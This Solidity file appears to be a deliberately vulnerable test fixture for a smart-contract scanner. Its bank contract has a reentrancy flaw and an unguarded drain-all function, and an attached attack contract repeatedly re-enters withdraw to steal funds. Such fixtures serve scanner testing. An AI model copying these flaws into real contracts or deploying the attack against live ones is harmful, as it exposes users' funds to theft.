// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VulnerableBank
 * @notice INTENTIONALLY VULNERABLE - For testing N3 scanner only
 * @dev Contains multiple security vulnerabilities for demonstration
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    /**
     * @dev VULNERABLE: Reentrancy attack possible
     * External call made before state update
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABLE: External call before state change
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State change AFTER external call - reentrancy possible!
        balances[msg.sender] -= amount;
        
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @dev VULNERABLE: Missing access control
     * Anyone can call this critical function
     */
    function emergencyWithdrawAll() external {
        // VULNERABLE: No onlyOwner or access control!
        uint256 balance = address(this).balance;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
    
    /**
     * @dev Deposit function (safe)
     */
    function deposit() external payable {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @dev Get contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Get user balance
     */
    function getUserBalance(address user) external view returns (uint256) {
        return balances[user];
    }
    
    receive() external payable {
        balances[msg.sender] += msg.value;
    }
}

/**
 * @title AttackContract
 * @notice Reentrancy attack contract for testing
 */
contract AttackContract {
    VulnerableBank public target;
    uint256 public attackCount;
    uint256 public maxAttacks = 3;
    
    constructor(address _target) {
        target = VulnerableBank(_target);
    }
    
    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack");
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    
    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw(msg.value);
        }
    }
}
